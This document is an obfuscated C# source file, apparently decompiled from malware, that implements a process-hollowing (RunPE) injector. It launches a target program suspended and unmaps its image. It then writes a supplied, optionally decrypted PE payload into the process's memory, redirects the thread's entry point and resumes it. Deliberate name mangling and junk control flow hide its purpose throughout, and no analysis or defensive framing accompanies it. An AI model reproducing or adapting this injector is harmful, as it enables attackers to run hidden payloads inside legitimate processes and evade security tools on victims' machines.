using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class _______________________________________________________________________
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct ________________________________________________________________________
	{
		public IntPtr _;

		public IntPtr __;

		public uint ___;

		public uint ____;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct _________________________________________________________________________
	{
		public int _;

		public string __;

		public string ___;

		public string ____;

		public int _____;

		public int ______;

		public int _______;

		public int ________;

		public int _________;

		public int __________;

		public int ___________;

		public int ____________;

		public short _____________;

		public short ______________;

		public int _______________;

		public int ________________;

		public int _________________;

		public int __________________;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CreateProcess(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr intptr_2, string string_2, ref _________________________________________________________________________ __________________________________________________________________________0, ref ________________________________________________________________________ _________________________________________________________________________0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, int int_0, ref int int_1, int int_2, ref int int_3);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, int int_0, byte[] byte_0, int int_1, ref int int_2);

	[DllImport("ntdll.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int NtUnmapViewOfSection(IntPtr intptr_0, int int_0);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int VirtualAllocEx(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int ResumeThread(IntPtr intptr_0);

	public unsafe static bool ___________(string string_0, string string_1, byte[] byte_0, bool bool_0, bool bool_1 = false, bool bool_2 = false)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				return false;
			}
			int num2 = default(int);
			if (bool_1)
			{
				nint num = (nint)Type.EmptyTypes.LongLength + 0;
				while (true)
				{
					byte[] byte_;
					nint intPtr;
					switch (num)
					{
					default:
						byte_ = byte_0;
						intPtr = (((0x27 & (40 * num2 + num2 * 2041577472 + 24 * num2)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 536) : ((nint)Type.EmptyTypes.LongLength + -1218376522));
						goto IL_004f;
					case 1:
						break;
					}
					break;
					IL_004f:
					byte_0 = ___________________________________________________________________._______(byte_, _003CModule_003E.__________((int)intPtr, sizeof(long) + 4087, 168));
					num = sizeof(ushort) + -1;
				}
			}
			num2 = 1;
			do
			{
				if (!____________(string_0, string_1, byte_0, bool_0, bool_2))
				{
					num2++;
					continue;
				}
				return true;
			}
			while (num2 <= 5);
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private unsafe static bool ____________(string string_0, string string_1, byte[] byte_0, bool bool_0, bool bool_1)
	{
		string text = string.Format(_003CModule_003E.___<string>(1983666748u), string_0);
		_________________________________________________________________________ __________________________________________________________________________2 = default(_________________________________________________________________________);
		________________________________________________________________________ _________________________________________________________________________ = default(________________________________________________________________________);
		__________________________________________________________________________2._ = Marshal.SizeOf(typeof(_________________________________________________________________________));
		try
		{
			int num = default(int);
			if (~(8 * ((num << 28) - 9148)) == num * 256)
			{
				goto IL_0343;
			}
			if (bool_1)
			{
				__________________________________________________________________________2.____________ = 1;
				goto IL_00f9;
			}
			__________________________________________________________________________2.____________ = 0;
			nint num2 = sizeof(ushort) + 9;
			goto IL_04f2;
			IL_02a4:
			short num3 = default(short);
			int num4 = num3 - 1;
			int num5 = 0;
			goto IL_02ac;
			IL_024c:
			int[] array = new int[179];
			array[0] = 65538;
			int int_ = default(int);
			if (-(771 * int_ + int_ * 253) != -1446)
			{
				goto IL_007c;
			}
			num2 = (nint)Type.EmptyTypes.LongLength + -1663267742;
			goto IL_04f2;
			IL_0367:
			int srcOffset = default(int);
			byte[] array2 = default(byte[]);
			Buffer.BlockCopy(byte_0, srcOffset, array2, 0, array2.Length);
			int int_2 = default(int);
			int num6 = default(int);
			if ((~(int_2 * -1639972864) & 0x874) == 2164 && num6 == -12040)
			{
				goto IL_018d;
			}
			goto IL_03d1;
			IL_04f2:
			int int_3 = default(int);
			int num7 = default(int);
			int num8 = default(int);
			int int_4 = default(int);
			bool flag = default(bool);
			while (true)
			{
				switch (num2)
				{
				case 14:
					break;
				case 4:
					goto IL_008f;
				default:
					goto IL_00f9;
				case 5:
					goto IL_024c;
				case 10:
					goto IL_02ea;
				case 0:
					goto IL_0343;
				case 9:
					int_3 = BitConverter.ToInt32(byte_0, num7 + 84);
					num = VirtualAllocEx(_________________________________________________________________________._, num8, int_4, 12288, 64);
					num2 = (nint)Type.EmptyTypes.LongLength + 1;
					continue;
				case 8:
					goto IL_0423;
				case 1:
					goto IL_04d2;
				case 2:
					throw new Exception();
				case 3:
					throw new Exception();
				case 7:
					throw new Exception();
				case 12:
					if (!SetThreadContext(_________________________________________________________________________.__, array))
					{
						throw new Exception();
					}
					goto IL_0578;
				case 6:
					goto IL_0578;
				case 13:
					goto IL_05a5;
				}
				break;
				IL_04d2:
				if (!bool_0 && num == 0)
				{
					flag = true;
					num6 = (int)((nint)Type.EmptyTypes.LongLength + 16975);
					num2 = sizeof(byte) + 7;
					continue;
				}
				goto IL_045a;
			}
			goto IL_007c;
			IL_018d:
			int num9 = default(int);
			int num11 = default(int);
			if (WriteProcessMemory(_________________________________________________________________________._, num + num9, array2, array2.Length, ref int_2))
			{
				num6 = (int)((nint)Type.EmptyTypes.LongLength + 13133);
				int num10 = default(int);
				num2 = ((-268435456 * (num5 & 0x1872) * (num5 * 88 + 40 * num5) >= 0) ? ((nint)Type.EmptyTypes.LongLength + 10) : ((((-num10 ^ (num10 - 4234)) & 1) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1643436174) : ((~((uint)num11 / 122u) == 8368) ? ((nint)Type.EmptyTypes.LongLength + -1944890130) : (sizeof(uint) + -1788350793))));
				goto IL_04f2;
			}
			throw new Exception();
			IL_0343:
			int num12 = default(int);
			array2 = new byte[num12 - 1 + 1];
			int num13 = num6;
			num6 = -12040;
			if (num13 == -22696)
			{
				goto IL_024c;
			}
			goto IL_0367;
			IL_00f9:
			if (string.IsNullOrEmpty(string_1))
			{
				if (!CreateProcess(string_0, text, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref __________________________________________________________________________2, ref _________________________________________________________________________))
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 3;
					goto IL_04f2;
				}
			}
			else
			{
				text = text + Strings.Space(1) + string_1;
				num6 = 1541;
				if (sizeof(double) + 1462 == -27986)
				{
					goto IL_0578;
				}
				if (!CreateProcess(string_0, text, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref __________________________________________________________________________2, ref _________________________________________________________________________))
				{
					if (num6 == 1541)
					{
						throw new Exception();
					}
					goto IL_018d;
				}
			}
			num7 = BitConverter.ToInt32(byte_0, 60);
			num8 = BitConverter.ToInt32(byte_0, num7 + 52);
			goto IL_024c;
			IL_007c:
			if (!GetThreadContext(_________________________________________________________________________.__, array))
			{
				throw new Exception();
			}
			goto IL_008f;
			IL_045a:
			if (num != 0)
			{
				if (!WriteProcessMemory(_________________________________________________________________________._, num, byte_0, int_3, ref int_2))
				{
					num6 = -17433;
					if ((nint)Type.EmptyTypes.LongLength + -27236 != -27236)
					{
						goto IL_018d;
					}
					throw new Exception();
				}
				num11 = num7 + 248;
				num3 = BitConverter.ToInt16(byte_0, num7 + 6);
				num6 = 1903;
				if (sizeof(long) + -17441 != 16534)
				{
					goto IL_02a4;
				}
				goto IL_0578;
			}
			throw new Exception();
			IL_008f:
			int num14 = array[41];
			if (!ReadProcessMemory(_________________________________________________________________________._, num14 + 8, ref int_, 4, ref int_2))
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 7;
			}
			else if (num8 == int_ && NtUnmapViewOfSection(_________________________________________________________________________._, int_) != 0)
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 2;
			}
			else
			{
				int_4 = BitConverter.ToInt32(byte_0, num7 + 80);
				num2 = (nint)Type.EmptyTypes.LongLength + 9;
			}
			goto IL_04f2;
			IL_05a5:
			throw new Exception();
			IL_0578:
			if (ResumeThread(_________________________________________________________________________.__) == -1)
			{
				throw new Exception();
			}
			if (________________________._ == 1)
			{
				________________________._ = (int)_________________________________________________________________________.___;
				return true;
			}
			______________________________________________________________________________._____((int)_________________________________________________________________________.___);
			return true;
			IL_02ac:
			if (num5 <= num4)
			{
				num6 = 17418;
				num9 = BitConverter.ToInt32(byte_0, num11 + 12);
				num12 = BitConverter.ToInt32(byte_0, num11 + 16);
				srcOffset = BitConverter.ToInt32(byte_0, num11 + 20);
				if (num12 == 0)
				{
					goto IL_02ea;
				}
				int _______________ = _003CModule_003E.________________;
				num6 = (int)(((_______________ << 13 << 18) - -1073741824 != (int)((uint)_______________ / 122u)) ? (sizeof(Guid) + 6784) : ((nint)Type.EmptyTypes.LongLength + 1083172601));
				goto IL_0343;
			}
			byte[] bytes = BitConverter.GetBytes(num);
			int num15 = default(int);
			if (WriteProcessMemory(_________________________________________________________________________._, num14 + 8, bytes, 4, ref int_2))
			{
				num15 = BitConverter.ToInt32(byte_0, num7 + 40);
				num6 = 21948;
				goto IL_03d1;
			}
			goto IL_05a5;
			IL_02ea:
			num6 = 13133;
			if (((uint)(256 * (2 * num4 + 2 * num4)) ^ 0x23F6u) != 0)
			{
				num11 += 40;
				num5++;
				if (num6 != 13133)
				{
					goto IL_02a4;
				}
				goto IL_02ac;
			}
			goto IL_0367;
			IL_03d1:
			if (flag)
			{
				num = num8;
			}
			array[44] = num + num15;
			num2 = sizeof(short) + 10;
			goto IL_04f2;
			IL_0423:
			num = VirtualAllocEx(_________________________________________________________________________._, 0, int_4, 12288, 64);
			if ((0xFFFFF5BFu ^ (uint)(num6 * -1547698176)) != 0 && num6 == 18562)
			{
				goto IL_0367;
			}
			goto IL_045a;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Process.GetProcessById((int)_________________________________________________________________________.___)?.Kill();
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
